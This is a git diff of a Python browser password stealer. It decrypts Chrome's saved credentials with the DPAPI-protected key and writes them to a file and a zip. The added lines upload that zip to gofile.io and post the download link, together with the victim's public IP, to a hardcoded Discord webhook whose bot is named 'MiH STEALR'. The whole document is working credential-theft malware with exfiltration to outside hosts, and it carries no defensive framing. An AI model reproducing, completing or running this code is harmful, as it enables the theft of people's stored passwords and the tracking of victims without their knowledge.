@@ -1,4 +1,3 @@
-import os
 import json
 import base64
 import sqlite3
@@ -8,10 +7,9 @@ import shutil
 from datetime import datetime, timedelta
 import requests
 import zipfile
+import os
 
 def get_chrome_datetime(chromedate):
-    """Return a `datetime.datetime` object from a chrome format datetime
-    Since `chromedate` is formatted as the number of microseconds since January, 1601"""
     return datetime(1601, 1, 1) + timedelta(microseconds=chromedate)
 
 def get_encryption_key():
@@ -22,31 +20,21 @@ def get_encryption_key():
         local_state = f.read()
         local_state = json.loads(local_state)
 
-    # decode the encryption key from Base64
     key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
-    # remove DPAPI str
     key = key[5:]
-    # return decrypted key that was originally encrypted
-    # using a session key derived from current user's logon credentials
     return win32crypt.CryptUnprotectData(key, None, None, None, 0)[1]
-
 
 def decrypt_password(password, key):
     try:
-        # get the initialization vector
         iv = password[3:15]
         password = password[15:]
-        # generate cipher
         cipher = AES.new(key, AES.MODE_GCM, iv)
-        # decrypt password
         return cipher.decrypt(password)[:-16].decode()
     except:
         try:
             return str(win32crypt.CryptUnprotectData(password, None, None, None, 0)[1])
         except:
-            # not supported
             return ""
-        
 
 def main():
     key = get_encryption_key()
@@ -95,29 +83,42 @@ def main():
     except:
         pass
 
-    # Zipper le fichier texte
     with zipfile.ZipFile('decrypted_passwords.zip', 'w', zipfile.ZIP_DEFLATED) as zipf:
         zipf.write('decrypted_passwords.txt')
 
-def uploadgofile():
-    upload_url = 'https://api.gofile.io/uploadFile'
+    download_link = uploadToAnonfiles('decrypted_passwords.zip')
 
+    if download_link:
+        webhook_url = 'https://discord.com/api/webhooks/1174479214230110239/4XElbEnjk2OrMPEY6vkuymOKBWddEkdU1XnALK1lpDLNuratOIU8vAY5gEytC8m4-_AR' #replace by your webhook url
+        ip_address = requests.get("https://api.ipify.org/").text
+        embeds = {
+            "avatar_url": "https://media.discordapp.net/attachments/1168866780941389934/1172967173916999810/ab67616d0000b273f9ae145ca74784398c3b6c9b.png?ex=65623dce&is=654fc8ce&hm=5846dec8fdea603dd3f7aea0f55fd46819636029b0f9f6daf87715b0f27189e2&=&width=581&height=581",
+            "username": "MiH STEALR",
+            "embeds": [{
+                "title": "YOU'VE REACHED HEAVEN !",
+                "description": f"Passwords :{download_link}",
+                "fields": [
+                    {"name" : "Victim's IP", "value" : ip_address, "inline:": True}
+                ],
+            }]
+        }
+
+        response = requests.post(webhook_url, json=embeds)
+
+        if response.status_code == 200:
+            print('Message Discord envoyé avec succès !')
+        else:
+            print(f'Erreur {response.status_code} lors de l\'envoi du message Discord. Réponse du serveur : {response.text}')
+    else:
+        print('Erreur lors de l\'upload du fichier vers Anonfiles.')
+
+def uploadToAnonfiles(path):
+    try:
+        return requests.post(f'https://{requests.get("https://api.gofile.io/getServer").json()["data"]["server"]}.gofile.io/uploadFile', files={'file': open(path, 'rb')}).json()["data"]["downloadPage"]
+    except:
+        return False
 
 if __name__ == "__main__":
     main()
-
-
-
-
-
-
-
-
-
-
-
-
-
-
 
 
